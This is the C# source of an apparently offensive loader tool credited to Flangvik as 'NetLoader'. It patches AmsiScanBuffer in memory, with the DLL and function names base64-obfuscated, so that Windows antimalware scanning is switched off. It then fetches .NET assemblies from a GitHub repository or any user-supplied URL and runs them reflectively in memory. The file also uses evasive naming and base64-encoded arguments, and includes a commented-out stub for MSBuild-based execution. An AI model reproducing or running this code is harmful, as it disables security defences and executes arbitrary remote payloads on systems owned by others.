﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

//This if for MSBuild LOL bin stuff later
//using Microsoft.Build.Framework;
//using Microsoft.Build.Utilities;
public class TotallyNotNt
{
    static WebClient leaveMeAlone = new WebClient() { };
    static string _repURL = "https://github.com/Flangvik/NetLoader/tree/master/Binaries";

    public static void Main(string[] args)
    {
        Console.WriteLine("[!] ~Flangvik  #NetLoader");
        MoveLifeAhead();

        while (true)
        {
            try
            {
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;

                if (args.Length == 0)
                {
                    List<string> binList = GetBins();

                    Console.WriteLine("[+] Select a binary (number)>");
                    Console.WriteLine("------------------------");
                    Console.WriteLine("[0] - Exit NetLoader");
                    for (int goodGuyNumber = 0; goodGuyNumber < binList.Count; goodGuyNumber++)
                    {
                        Console.WriteLine("[" + (goodGuyNumber + 1) + "] - " + binList[goodGuyNumber]);

                        if (goodGuyNumber == binList.Count - 1)
                        {
                            Console.WriteLine("[" + (goodGuyNumber + 2) + "] - Custom PATH or URL ");
                        }
                    }
                    Console.WriteLine("-----------------------");

                    var rawInput = Console.ReadLine();

                    if (Convert.ToInt32(rawInput) == 0)
                    {
                        System.Environment.Exit(1);

                    }
                    else if (Convert.ToInt32(rawInput) - 1 == binList.Count)
                    {
                        Console.WriteLine("[+] Input your own URL / Local Path / direct link to binary");
                        string binUrl = Console.ReadLine();

                        Console.WriteLine("[+] Provide arguments for {0} >", binUrl);
                        string binArgs = Console.ReadLine();
                        leaveThisAlone("", binArgs, binUrl, false);



                    }
                    else if (Convert.ToInt32(rawInput) - 1 > binList.Count | Convert.ToInt32(rawInput) - 1 < 0)
                    {
                        Console.WriteLine("[!] Bad Input, sry!");
                    }
                    else
                    {
                        Console.WriteLine("[+] Provide arguments for {0} >", binList[Convert.ToInt32(rawInput) - 1]);
                        string binArgs = Console.ReadLine();
                        leaveThisAlone(binList[Convert.ToInt32(rawInput) - 1], binArgs);

                    }
                }
                else
                {

                    string payloadPath = "";
                    string payloadArgs = "";
                    bool base64Decode = false;

                    foreach (var argument in args)
                    {
                        if (argument.ToLower().Contains("path"))
                        {
                            var argData = Array.IndexOf(args, argument) + 1;
                            if (argData < args.Length)
                            {
                                var rawPayload = args[Array.IndexOf(args, argument) + 1];
                                if (base64Decode)
                                    payloadPath = Encoding.UTF8.GetString(Convert.FromBase64String(rawPayload));
                                else
                                    payloadPath = rawPayload;
                            }

                        }

                        if (argument.ToLower().Contains("b64"))
                            base64Decode = true;

                        if (argument.ToLower().Contains("args"))
                        {
                            var argData = Array.IndexOf(args, argument) + 1;
                            if (argData < args.Length)
                            {

                                var rawPayloadArgs = args[Array.IndexOf(args, argument) + 1];
                                if (base64Decode)
                                    payloadArgs = Encoding.UTF8.GetString(Convert.FromBase64String(rawPayloadArgs));
                                else
                                    payloadArgs = rawPayloadArgs;
                            }
                        }
                    }

                    if (args.Length == 1 && string.IsNullOrEmpty(payloadArgs) && string.IsNullOrEmpty(payloadPath) && !base64Decode)
                    {
                        payloadPath = args[0];
                    }

                    if (args.Length == 2 && string.IsNullOrEmpty(payloadArgs) && string.IsNullOrEmpty(payloadPath) && !base64Decode)
                    {
                        payloadArgs = args[1];
                        payloadPath = args[0];
                    }

                    if (args.Length == 3 && string.IsNullOrEmpty(payloadArgs) && string.IsNullOrEmpty(payloadPath) && base64Decode)
                    {
                        payloadPath = Encoding.UTF8.GetString(Convert.FromBase64String(args[1]));
                        payloadArgs = Encoding.UTF8.GetString(Convert.FromBase64String(args[2]));
                    }

                    if (args.Length == 2 && base64Decode)
                    {
                        if (!string.IsNullOrEmpty(args[1]))
                            payloadPath = Encoding.UTF8.GetString(Convert.FromBase64String(args[1]));
                    }

                    if (!string.IsNullOrEmpty(payloadPath))
                    {
                        Console.WriteLine("[+] Starting {0} with args {1}", payloadPath, payloadArgs);
                        leaveThisAlone("", payloadArgs, payloadPath, false);
                        Environment.Exit(0);
                    }

                    Environment.Exit(0);
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Damn, it failed, to bad");
                Console.WriteLine("[!] {0}", ex.Message);
                Environment.Exit(0);
            }
        }
    }



    public static void leaveThisAlone(string binName, string arguments = "", string customUrl = "", bool randomStuff = true)
    {


        if (!randomStuff)
        {
            if (!customUrl.StartsWith("http"))
            {
                testMe(Assembly.Load(File.ReadAllBytes(customUrl)), arguments).Invoke(null, new object[] { new string[] { arguments } });


            }
            else
            {
                testMe(Assembly.Load(leaveMeAlone.DownloadData(customUrl)), arguments).Invoke(null, new object[] { new string[] { arguments } });

            }
        }
        else
        {
            testMe(Assembly.Load(leaveMeAlone.DownloadData(_repURL.Replace("tree", "blob") + "/" + binName + "?raw=true")), arguments).Invoke(null, new object[] { new string[] { arguments } });
        }



    }


    public static MethodInfo testMe(Assembly asm, string args)
    {

        // Get your point of entry.
        MethodInfo Ripped = asm.EntryPoint;

        //Invoke point of entry with arguments.
        //Ripped.
        return Ripped;

    }

    public static List<string> GetBins()
    {

        var avBinaries = new List<string>() { };
        var websiteSource = leaveMeAlone.DownloadString(_repURL);

        Regex rgx = new Regex(@"\/[A-Za-z]{0,50}\.bin", RegexOptions.IgnoreCase);
        foreach (var match in rgx.Matches(websiteSource))
        {
            avBinaries.Add(match.ToString().TrimStart('/'));
        }

        return avBinaries;

    }

    public static void CopyData(byte[] dataStuff, IntPtr intAddr)
    {

        Marshal.Copy(dataStuff, 0, intAddr, dataStuff.Length);
    }

    private static void MoveLifeAhead(bool BigBoy = false)
    {
        try
        {
            var fooBar = WinLibBase.LoadLibrary(Encoding.UTF8.GetString(Convert.FromBase64String("YW1zaS5kbGw=")));
            IntPtr addr = WinLibBase.GetProcAddress(fooBar, Encoding.UTF8.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI=")));
            uint magicRastaValue = 0x40;

            uint someNumber = 0;

            if (System.Environment.Is64BitOperatingSystem)
            {
                var bigBoyBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

                Console.WriteLine("[+] Patching...");

                WinLibBase.VirtualProtect(addr, (UIntPtr)bigBoyBytes.Length, magicRastaValue, out someNumber);

                CopyData(bigBoyBytes, addr);

                Console.WriteLine("[+] Patched!");
            }
            else
            {
                var smallBoyBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

                Console.WriteLine("[+] Patching ...");

                WinLibBase.VirtualProtect(addr, (UIntPtr)smallBoyBytes.Length, magicRastaValue, out someNumber);

                CopyData(smallBoyBytes, addr);

                Console.WriteLine("[+] Patched!");

            }


        }
        catch (Exception ex)
        {
            Console.WriteLine("[!] {0}", ex.Message);

        }
    }


}

public class WinLibBase
{

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}

/*
 //This is for MSBuild later
public class ClassExample : Task, ITask
{
    public override bool Execute()
    {
        TotallyNotNt.Main(new string[] { });
        return true;
    }
}
*/
